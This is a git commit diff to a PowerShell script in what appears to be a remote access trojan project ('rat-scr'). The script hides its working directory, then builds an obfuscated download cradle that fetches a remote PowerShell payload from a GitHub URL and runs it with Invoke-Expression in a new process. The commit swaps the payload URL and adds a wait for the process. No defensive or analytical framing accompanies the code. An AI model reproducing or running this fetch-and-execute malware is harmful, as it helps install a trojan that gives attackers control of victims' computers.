b267d0b4381d16b44090e888a530f342b2e2cd74
43a1723 <hai1723notgay@gmail.com>
2024-08-13 16:27:13 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -4,6 +4,7 @@ attrib +h +s $dir
 cd $dir
 Set-Location -Path $dir
 
-$shellcode = ("https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
+$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+$proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+$proc.WaitForExit()
